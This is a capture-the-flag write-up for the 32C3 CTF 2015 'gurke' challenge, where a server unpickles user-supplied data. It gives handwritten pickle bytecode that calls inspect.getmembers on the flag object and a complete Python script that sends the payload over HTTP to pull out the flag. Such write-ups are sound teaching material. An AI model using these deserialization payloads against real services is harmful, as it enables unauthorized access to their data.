# 32C3 CTF 2015 : gurke

**Category:** Misc
**Points:** 300
**Solves:** 111
**Description:**

> Non-standard [gurke](./gurke): <https://32c3ctf.ccc.ac/uploads/gurke> Talk to it via HTTP on <http://136.243.194.43/>.


## Write-up

"It's not a standard gurke" is quite accurate.
First it creates a flag object, which contains the flag in the "flag" attribute.
Then it establishes a syscall-filter which is quite restrictive.
Finally it does what we were looking for: A pickle.load with user supplied data:

    data = os.read(0, 4096)
    try:
      res = pickle.loads(data)
      print 'res: %r\n' % res
    except Exception as e:
      print >>sys.stderr, "exception", repr(e)


However the syscall-filter prevents us from suppling a pickled object with a malicious
__reduce__ function, instead we have to get hold of the "flag" object's flag attribute.

Therefore we have to write a little pickle bytecode:

    cinspect\ngetmembers\n(c__main__\nflag\ntR.\n

Which is based on the opcode overview found here:
http://svn.python.org/projects/python/trunk/Lib/pickle.py

The pickle interpreter works stack-based and the code above does the following (pseudocode):

    push inspect.getmembers
    push __main__.flag
    pop func
    pop arg
    push (func, arg)
    call func(arg)
    ret

Which basically calls inspect.getmembers(flag).
The output will include the flag attribute and it's value.

The complete exploit:

    import urllib, urllib2
    import re
    url = 'http://136.243.194.43/'
    # pickle bytecode
    # c:module:function pushes object on the stack
    # (: push mark object
    # t:  pop two top most stack elements + create tuple of them + push tuple
    # R: call callable top most stack element
    # .: rerturn
    req = urllib2.Request(url, data="cinspect\ngetmembers\n(c__main__\nflag\ntR.\n", headers={'Content-type': 'application/python-pickle'})
    response = urllib2.urlopen(req)
    the_page = response.read()
    flag = re.findall("32c3_.{25}", the_page)[0]
    print "flag: " + flag


## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-12-27-32c3/gurke_misc_300#eng-version>
* <http://blukat29.github.io/2015/12/32c3ctf-gurke/>
* <https://github.com/krx/CTF-Writeups/tree/master/32C3%202015/misc300%20-%20gurke>
* <http://nopat.ch/2015/12/29/32c3ctf-misc-gurke/>
* <http://katc.hateblo.jp/entry/2015/12/30/154329>
* <https://irq5.io/2015/12/30/32c3-ctf-write-up-gurke/>
* <http://nandynarwhals.org/2015/12/31/32c3ctf-gurke-misc-300/>
* <http://pastebin.com/JikU89uJ>
